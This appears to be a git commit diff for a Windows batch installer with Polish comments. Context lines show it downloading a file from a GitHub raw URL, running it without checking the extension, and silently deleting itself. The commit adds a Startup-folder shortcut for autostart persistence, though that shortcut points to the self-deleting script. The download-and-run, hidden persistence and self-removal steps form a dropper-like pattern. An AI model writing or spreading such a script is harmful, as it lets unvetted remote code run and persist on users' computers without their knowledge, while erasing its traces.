3b473515666d2bdc4e3edc1a8d572cce4415707d
petrohemia <piotrus.barwicki@gmail.com>
2025-07-08 14:52:37 +0200

    Update installManager.bat Autostart

--- installManager.bat
+++ installManager.bat
@@ -19,5 +19,11 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/p
 :: Uruchom bez sprawdzania rozszerzenia
 start "" "%DEST%\%FILE%"
 
+:: Dodaj skrót do autostartu, jeśli jeszcze nie istnieje
+set SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\launcher.lnk
+if not exist "%SHORTCUT%" (
+    powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%SHORTCUT%'); $Shortcut.TargetPath = '%~f0'; $Shortcut.Save()"
+)
+
 :: Wydziel samousuwanie do osobnego procesu, aby nie blokować pliku .bat
 powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item '%~f0' -Force" & exit
